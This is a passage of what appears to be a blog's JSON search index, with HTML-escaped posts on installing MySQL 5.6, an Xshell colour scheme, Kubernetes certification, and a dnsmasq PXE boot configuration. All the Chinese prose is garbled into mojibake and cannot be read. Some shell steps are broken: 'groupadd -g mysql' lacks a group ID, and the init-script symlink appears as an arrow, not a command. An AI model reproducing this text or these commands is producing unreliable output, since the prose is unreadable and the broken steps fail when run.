class=\"s\"\u003ebasedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½•\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edatadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# å…è®¸æœ€å¤§è¿æ¥æ•°\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emax_connections=200\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†é»˜è®¤ä¸º8æ¯”ç‰¹ç¼–ç çš„latin1å­—ç¬¦é›†\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003echaracter-set-server=utf8\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edefault-storage-engine=INNODB\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#lower_case_table_name=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emax_allowed_packet=16M\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroupadd -g mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euseradd -g mysql mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åˆå§‹åŒ–DB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å»ºç«‹ /etc/init.d/mysql çš„è½¯é“¾æ¥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -\u0026gt; /app/mysql-5.6.51/support-files/mysql.server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¯åŠ¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/init.d/mysql start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å®‰å…¨è®¾ç½®DB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"å››å‡†å¤‡onlyoffice\"\u003eå››ã€å‡†å¤‡onlyoffice\u003c/h5\u003e\n\u003cp\u003eè¿™é‡Œæœ‰å¤§å‘å•Šï¼Œå…¶å®onlyofficeçš„ç‰ˆæœ¬ä¸‡ä¸‡ä¸èƒ½ç”¨æœ€æ–°çš„ï¼Œå› ä¸ºJWTçš„Tokenè®¤è¯\u003c/p\u003e","title":"seafileé…æ­onlyofficeçš„å®‰è£…"},{"content":"åˆšé€šè¿‡äº†CKAçš„è€ƒè¯•ï¼Œæ‹¿åˆ°äº†è¯ä¹¦ã€‚\nè¯´è€å®è¯ï¼Œæƒ³è€ƒè¿™ä¸ªå¿…é¡»ç¿»å¢™å•Šï¼Œåœ¨è€ƒè¯•çš„æ—¶å€™æ­£å¥½æ˜¯æ–°å† çš„ç¬¬ä¸‰å¤©ï¼Œçƒ§å¾—æ­£å‰å®³ã€‚\nç„¶åè€ƒè¯•çš„è¿‡ç¨‹çœŸæ˜¯ä¸€æ³¢ä¸‰æŠ˜ï¼ŒPSI è¶³è¶³é‡æ–°è®¤è¯äº†ä¸‰æ¬¡ï¼Œæµªè´¹40åˆ†é’Ÿã€‚\næœ€åéƒ½æ„Ÿè§‰è¦å®Œè›‹äº†ï¼Œåªå‰©ä¸‹ä¸åˆ°10åˆ†é’Ÿæ£€æŸ¥ï¼Œç»“æœè¿˜ä¸é”™ï¼Œè€ƒäº†90åˆ†ã€‚\næœ‰ç¬¬ä¸€æ¬¡è€ƒçš„å¯ä»¥è”ç³»æˆ‘ï¼Œæˆ‘ç»™ä½ è¯´ä¸€äº›å¿…é¡»æ³¨æ„çš„äº‹é¡¹ã€‚\nç„¶å CKA æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿè€ƒè¯•ï¼Œ36å°æ—¶æ—¶é—´ï¼Œå®é™…è€ƒè¯•çš„ç¯å¢ƒè·Ÿæ¨¡æ‹Ÿçš„å®Œå…¨ä¸ä¸€æ ·å•Šã€‚\nä½†æ˜¯æ¨¡æ‹Ÿå¦‚æœä½ èƒ½è¿‡ï¼Œé‚£è€ƒè¯•ä½ ä¸€å®šèƒ½è¿‡ï¼Œæ¨¡æ‹Ÿçš„éš¾åº¦ä¸ä½ï¼Œç›¸å½“é«˜ã€‚\nè¿™å°±æŠŠæ¨¡æ‹Ÿçš„é¢˜ç»™æ”¾å‡ºæ¥ï¼Œä¾›å¤§å®¶å‚è€ƒï¼Œéå¸¸æœ‰å‚è€ƒä»·å€¼ã€‚\nå¤§å®¶å¯ä»¥å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚\næ–‡ä»¶ä¸‹è½½ï¼šcka.html å•htmlæ–‡ä»¶\n","permalink":"https://rendoumi.com/posts/20230112-cka_exam/","summary":"\u003cp\u003eåˆšé€šè¿‡äº†CKAçš„è€ƒè¯•ï¼Œæ‹¿åˆ°äº†è¯ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eè¯´è€å®è¯ï¼Œæƒ³è€ƒè¿™ä¸ªå¿…é¡»ç¿»å¢™å•Šï¼Œåœ¨è€ƒè¯•çš„æ—¶å€™æ­£å¥½æ˜¯æ–°å† çš„ç¬¬ä¸‰å¤©ï¼Œçƒ§å¾—æ­£å‰å®³ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åè€ƒè¯•çš„è¿‡ç¨‹çœŸæ˜¯ä¸€æ³¢ä¸‰æŠ˜ï¼ŒPSI è¶³è¶³é‡æ–°è®¤è¯äº†ä¸‰æ¬¡ï¼Œæµªè´¹40åˆ†é’Ÿã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åéƒ½æ„Ÿè§‰è¦å®Œè›‹äº†ï¼Œåªå‰©ä¸‹ä¸åˆ°10åˆ†é’Ÿæ£€æŸ¥ï¼Œç»“æœè¿˜ä¸é”™ï¼Œè€ƒäº†90åˆ†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ‰ç¬¬ä¸€æ¬¡è€ƒçš„å¯ä»¥è”ç³»æˆ‘ï¼Œæˆ‘ç»™ä½ è¯´ä¸€äº›å¿…é¡»æ³¨æ„çš„äº‹é¡¹ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶å CKA æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿè€ƒè¯•ï¼Œ36å°æ—¶æ—¶é—´ï¼Œå®é™…è€ƒè¯•çš„ç¯å¢ƒè·Ÿæ¨¡æ‹Ÿçš„å®Œå…¨ä¸ä¸€æ ·å•Šã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æ¨¡æ‹Ÿå¦‚æœä½ èƒ½è¿‡ï¼Œé‚£è€ƒè¯•ä½ ä¸€å®šèƒ½è¿‡ï¼Œæ¨¡æ‹Ÿçš„éš¾åº¦ä¸ä½ï¼Œç›¸å½“é«˜ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™å°±æŠŠæ¨¡æ‹Ÿçš„é¢˜ç»™æ”¾å‡ºæ¥ï¼Œä¾›å¤§å®¶å‚è€ƒï¼Œéå¸¸æœ‰å‚è€ƒä»·å€¼ã€‚\u003c/p\u003e\n\u003cp\u003eå¤§å®¶å¯ä»¥å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶ä¸‹è½½ï¼š\u003ca href=\"./cka.html\"\u003ecka.html\u003c/a\u003e å•htmlæ–‡ä»¶\u003c/p\u003e","title":"ckaçš„æ¨¡æ‹Ÿè¯•é¢˜"},{"content":"å…¶å®ä¸€ç›´ç”¨çš„ç»ˆç«¯è½¯ä»¶æ˜¯terminusï¼Œå…¨ç»ˆç«¯å¯ç”¨ï¼Œä»¥å‰ç”¨ ubuntuï¼Œéå¸¸å¥½ç”¨ã€‚\nç°åœ¨æ¢åˆ°æ–°å…¬å¸ï¼Œç”¨ Win10ï¼Œä¹Ÿè£…äº†ä¸€ä¸ªã€‚\nä¸€ç›´åˆ°æœºæˆ¿æ”¹é€ å‰ï¼Œè¿˜éƒ½è§‰å¾—è¡Œï¼Œä½†æ˜¯æœºæˆ¿æ”¹é€ éœ€è¦æ”¶å›æ ¸å¿ƒäº¤æ¢æœºã€è·¯ç”±å™¨çš„æƒé™ï¼Œå¼€ç»ˆç«¯ console å±…ç„¶è¦æ”¶è´¹ä¼šå‘˜ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾è€åˆ˜æ¢å›äº†å…è´¹çš„xshell 7ã€‚\nxshellçš„é…è‰²å®åœ¨æ˜¯å—ä¸äº†ï¼Œè¿˜æ˜¯å–œæ¬¢ç»¿è‰²çš„å­—ç¬¦ç•Œé¢ã€‚\nå¤‡ä»½ä¸€ä¸ªç»¿è‰²çš„æ–¹æ¡ˆï¼š\n[mycolor] text(bold)=e9e9e9 magenta(bold)=ff00ff text=00ff80 white(bold)=fdf6e3 green=80ff00 red(bold)=ff0000 green(bold)=3c5a38 black(bold)=808080 red=ff4500 blue=00bfff black=000000 blue(bold)=1e90ff yellow(bold)=ffff00 cyan(bold)=00ffff yellow=c0c000 magenta=c000c0 background=042028 white=c0c0c0 cyan=00c0c0 [Names] count=1 name0=mycolor ä¿å­˜æˆ mycolor.xcs æ–‡ä»¶ï¼Œç„¶åå·¥å…·\u0026ndash;\u0026gt; é…è‰²æ–¹æ¡ˆï¼Œå¯¼å…¥å³å¯ï¼š\næ•´ä½“æ•ˆæœè¿˜æ˜¯æ¯”è¾ƒå¥½çš„ã€‚\næ˜¯è‡ªå·±å–œæ¬¢çš„æ ·å­ï¼Œå½“ç„¶ï¼Œå­—ä½“ä»9ä¹Ÿå¢åŠ åˆ°äº†12ã€‚\n","permalink":"https://rendoumi.com/posts/20230112-xshell_colors/","summary":"\u003cp\u003eå…¶å®ä¸€ç›´ç”¨çš„ç»ˆç«¯è½¯ä»¶æ˜¯terminusï¼Œå…¨ç»ˆç«¯å¯ç”¨ï¼Œä»¥å‰ç”¨ ubuntuï¼Œéå¸¸å¥½ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨æ¢åˆ°æ–°å…¬å¸ï¼Œç”¨ Win10ï¼Œä¹Ÿè£…äº†ä¸€ä¸ªã€‚\u003c/p\u003e\n\u003cp\u003eä¸€ç›´åˆ°æœºæˆ¿æ”¹é€ å‰ï¼Œè¿˜éƒ½è§‰å¾—è¡Œï¼Œä½†æ˜¯æœºæˆ¿æ”¹é€ éœ€è¦æ”¶å›æ ¸å¿ƒäº¤æ¢æœºã€è·¯ç”±å™¨çš„æƒé™ï¼Œå¼€ç»ˆç«¯ console å±…ç„¶è¦æ”¶è´¹ä¼šå‘˜ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾è€åˆ˜æ¢å›äº†å…è´¹çš„xshell 7ã€‚\u003c/p\u003e\n\u003cp\u003exshellçš„é…è‰²å®åœ¨æ˜¯å—ä¸äº†ï¼Œè¿˜æ˜¯å–œæ¬¢ç»¿è‰²çš„å­—ç¬¦ç•Œé¢ã€‚\u003c/p\u003e\n\u003cp\u003eå¤‡ä»½ä¸€ä¸ªç»¿è‰²çš„æ–¹æ¡ˆï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emycolor\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etext\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003ee9e9e9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emagenta\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003eff00ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00ff80\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhite\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003efdf6e3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003egreen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e80ff00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ered\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003eff0000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egreen\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e3c5a38\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblack\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e\u003cspan class=\"m\"\u003e808080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ered\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eff4500\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eblue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00bfff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eblack\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblue\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e1e90ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyellow\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003effff00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecyan\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e00ffff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eyellow\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0c000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emagenta\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec000c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebackground\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e042028\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ewhite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0c0c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecyan\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00c0c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eNames\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ename0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emycolor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿å­˜æˆ mycolor.xcs æ–‡ä»¶ï¼Œç„¶åå·¥å…·\u0026ndash;\u0026gt; é…è‰²æ–¹æ¡ˆï¼Œå¯¼å…¥å³å¯ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230112112243176\" loading=\"lazy\" src=\"/posts/20230112-xshell_colors/image-20230112112243176.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ•´ä½“æ•ˆæœè¿˜æ˜¯æ¯”è¾ƒå¥½çš„ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230112112306637\" loading=\"lazy\" src=\"/posts/20230112-xshell_colors/image-20230112112306637.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ˜¯è‡ªå·±å–œæ¬¢çš„æ ·å­ï¼Œå½“ç„¶ï¼Œå­—ä½“ä»9ä¹Ÿå¢åŠ åˆ°äº†12ã€‚\u003c/p\u003e","title":"xshellçš„ç»¿è‰²é…è‰²æ–¹æ¡ˆ"},{"content":"2022å¹´ç»è¿‡åŠªåŠ›ï¼Œè€ƒäº†4å¼ è¯ä¹¦ï¼Œ2023å¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\né˜¿é‡Œäº‘çš„ACPè¯ä¹¦ï¼š\nAWSçš„SAA-C03è¯ä¹¦ï¼š\nK8Sçš„CKAè¯ä¹¦ï¼š\nK8Sçš„CKSè¯ä¹¦ï¼š\n","permalink":"https://rendoumi.com/posts/20230103-certificates/","summary":"\u003cp\u003e2022å¹´ç»è¿‡åŠªåŠ›ï¼Œè€ƒäº†4å¼ è¯ä¹¦ï¼Œ2023å¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003eé˜¿é‡Œäº‘çš„ACPè¯ä¹¦ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121806291\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121806291.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAWSçš„SAA-C03è¯ä¹¦ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121902909\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121902909.png\"\u003e\u003c/p\u003e\n\u003cp\u003eK8Sçš„CKAè¯ä¹¦ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121954249\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121954249.png\"\u003e\u003c/p\u003e\n\u003cp\u003eK8Sçš„CKSè¯ä¹¦ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103122032231\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103122032231.png\"\u003e\u003c/p\u003e","title":"2022å¹´è·å¾—çš„è¯ä¹¦"},{"content":"DNSMASQåšå±€åŸŸç½‘å†…çš„pxe installlæ˜¯æœ€åˆé€‚ä¸è¿‡çš„è½¯ä»¶äº†ã€‚ä¸ç”¨å•ç‹¬æ­å»º tftpserverï¼Œç”¨è‡ªå»ºçš„å³å¯ã€‚\nè€Œä¸”æ”¯æŒç»™å„ç§å­ç½‘æ‰“æ ‡ç­¾ï¼Œè¿˜å¯ä»¥æŒ‰æ ‡ç­¾å‘é€å„ç§dhcpåŒ…çš„ç‰¹å®šä¿¡æ¯ã€‚\ninterface=eth0 bind-dynamic pxe-prompt=\u0026#34;Rendoumi PXE System\u0026#34;, 5 domain-needed bogus-priv no-resolv no-poll #address=/jump.dedi.jp/install/103.108.236.5 #UP Stream DNS Server server=114.114.114.114 server=202.106.196.115 server=202.106.0.20 strict-order dhcp-authoritative dhcp-sequential-ip dhcp-no-override log-facility=/var/log/dnsmasq.log log-dhcp log-queries enable-tftp tftp-root = /export/servers/tftpboot #only new add host is dynamic, delete or modify not. #dhcp-hostsfile=/etc/dhcp-host/hosts.conf dhcp-hostsdir=/etc/dhcp-host # #Setup different options for each of the unique subnets, since default gateways will be different #The format for this is: dhcp-options=\u0026lt;your_tags_here\u0026gt;,\u0026lt;option\u0026gt;,\u0026lt;option_value\u0026gt; - #3 is router #1:netmask, 15:domain-name, 3:router, 6:dns-server, #44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope, #31:router-discovery, 33:static-route, 121:classless-static-route, #43:vendor-encap # dhcp-option=option:dns-server,172.18.30.1,172.18.30.2 dhcp-option=option:all-subnets-local,1 dhcp-option=option:T1,2m dhcp-option=option:T2,4m #dhcp-range=[tag:\u0026lt;tag\u0026gt;[,tag:\u0026lt;tag\u0026gt;],][set:\u0026lt;tag\u0026gt;,]\u0026lt;start-addr\u0026gt;[,\u0026lt;end-addr\u0026gt;|\u0026lt;mode\u0026gt;][,\u0026lt;netmask\u0026gt;[,\u0026lt;broadcast\u0026gt;]][,\u0026lt;lease time\u0026gt;] #vlan 1 native vlan #dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m dhcp-range=set:net1,172.18.29.100,static,2m dhcp-option-force=tag:net1,option:router,172.18.29.254 #vlan 199 wuli #dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m #dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m dhcp-range=set:net2,172.18.31.100,static,2m dhcp-option-force=tag:net2,option:router,172.18.31.254 # set tag \u0026#34;ipxe\u0026#34; if request comes from iPXE (\u0026#34;iPXE\u0026#34; user class) dhcp-userclass=set:ipxe,iPXE # alternative way, look for option 175 #dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option. # if request comes from dumb firmware, send them iPXE (via TFTP) #dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2 dhcp-boot=tag:!ipxe,undionly.kpxe # if request comes from iPXE, direct it to boot from boot1.php #dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php #--dhcp-boot=[tag:\u0026lt;tag\u0026gt;,]\u0026lt;filename\u0026gt;,[\u0026lt;servername\u0026gt;[,\u0026lt;server address\u0026gt;|\u0026lt;tftp_servername\u0026gt;]] dhcp-boot=tag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2 dhcp-boot=tag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2 # Args add(old del) mac ip hostname # add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27 #dhcp-script=/bin/echo #dhcp-leasefile=/var/log/dnsmasq.leases # !!!! tag is alphanumeric label, fuck !!!!! é™„ä¸Šundionly.kpxeï¼šundionly.kpxe\n","permalink":"https://rendoumi.com/posts/20221222-dnsmasq_pxe/","summary":"\u003cp\u003eDNSMASQåšå±€åŸŸç½‘å†…çš„pxe installlæ˜¯æœ€åˆé€‚ä¸è¿‡çš„è½¯ä»¶äº†ã€‚ä¸ç”¨å•ç‹¬æ­å»º tftpserverï¼Œç”¨è‡ªå»ºçš„å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œä¸”æ”¯æŒç»™å„ç§å­ç½‘æ‰“æ ‡ç­¾ï¼Œè¿˜å¯ä»¥æŒ‰æ ‡ç­¾å‘é€å„ç§dhcpåŒ…çš„ç‰¹å®šä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003einterface\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeth0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind-dynamic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epxe-prompt\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Rendoumi PXE System\u0026#34;\u003c/span\u003e, \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edomain-needed\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebogus-priv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-resolv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-poll\n\u003c/span\u003e\u003c/span\u003e\u003cspan 